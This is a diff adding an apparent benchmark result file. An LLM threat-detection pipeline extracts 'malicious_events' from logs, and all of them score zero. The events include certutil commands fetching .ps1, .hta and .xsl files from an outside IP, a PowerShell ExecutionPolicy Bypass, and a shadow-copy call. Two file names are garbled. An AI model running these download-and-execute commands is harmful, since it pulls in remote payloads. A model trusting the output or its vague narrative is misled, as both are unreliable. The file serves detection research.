@@ -1,0 +1,96 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/a C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1u2xzrek.ogg.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/a C:\\Users\\Administrator\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1u2xzrek.ogg.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c notepad.exe D:\\Log\\apt-new.txt",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -encode a.txt b.txt",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\H3XEP5DG\\Test[1].hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\H3XEP5DG\\Test[1].hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/msxslscript.xsl C:\\Users\\Administrator\\AppData\\Local\\Temp\\msxslscript.xsl",
+        "stage": "Execution"
+      },
+      {
+        "command": "(GWMI -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible')",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "An ongoing campaign appears to involve the installation of persistence mechanisms, execution of scripts for privilege escalation and credential access, and extensive network communication indicative of a command-and-control relationship. Multiple indicators point toward sophisticated spear-phishing or supply chain compromises.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 163290,
+      "completion_tokens": 5745,
+      "total_tokens": 169035,
+      "wall_clock_s": 76.34,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 11,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 11,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 163290,
+      "completion_tokens": 5745,
+      "total_tokens": 169035,
+      "wall_clock_s": 76.34,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
